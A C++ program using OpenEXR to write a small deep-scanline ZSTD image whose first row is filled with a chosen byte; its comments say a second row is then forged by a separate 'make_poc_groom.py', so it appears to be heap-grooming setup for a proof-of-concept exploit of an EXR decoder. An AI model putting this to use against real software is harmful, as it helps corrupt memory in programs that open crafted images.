// W174: valid deep+ZSTD EXR, 16x2, one FLOAT channel. Row 0 has 256
// samples/pixel (16 KiB unpacked, every sample set to the argv pixel byte);
// row 1 has one sample/pixel and is forged by make_poc_groom.py.
#include <ImfDeepScanLineOutputFile.h>
#include <ImfHeader.h>
#include <ImfChannelList.h>
#include <ImfDeepFrameBuffer.h>
#include <ImfPartType.h>
#include <Imath/ImathBox.h>
#include <cstdio>
#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <vector>

using namespace Imf;
using namespace Imath;
int main(int argc, char** argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s out.exr 0xPIXEL\n", argv[0]);
        return 1;
    }
    const int W = 16, H = 2, NSAMP0 = 256;
    uint32_t bits = (uint32_t)(unsigned char)strtoul(argv[2], nullptr, 0) * 0x01010101u;
    float pix;
    memcpy(&pix, &bits, sizeof pix);

    Header hdr(W, H);
    hdr.compression() = ZSTD_COMPRESSION;
    hdr.setType(DEEPSCANLINE);
    hdr.channels().insert("Z", Channel(Imf::FLOAT));
    hdr.dataWindow() = Box2i(V2i(0, 0), V2i(W - 1, H - 1));
    hdr.displayWindow() = Box2i(V2i(0, 0), V2i(W - 1, H - 1));

    DeepScanLineOutputFile file(argv[1], hdr);
    std::vector<unsigned int> sampleCount(W, NSAMP0);
    std::vector<float> zdata((size_t)W * NSAMP0, pix);
    std::vector<float*> zptrs(W);
    DeepFrameBuffer fb;
    fb.insertSampleCountSlice(
        Slice(Imf::UINT, (char*)sampleCount.data(), sizeof(unsigned int), 0));
    fb.insert("Z", DeepSlice(Imf::FLOAT, (char*)zptrs.data(),
                             sizeof(float*), 0, sizeof(float)));
    for (int y = 0; y < H; ++y) {
        std::fill(sampleCount.begin(), sampleCount.end(),
                  y == 0 ? (unsigned int)NSAMP0 : 1u);
        for (int i = 0; i < W; ++i) zptrs[i] = &zdata[(size_t)i * NSAMP0];
        file.setFrameBuffer(fb);
        file.writePixels(1);
    }
    printf("wrote %s W=16 H=2 row0_samples=%d pixel=0x%02x\n",
           argv[1], NSAMP0, bits & 0xff);
    return 0;
}
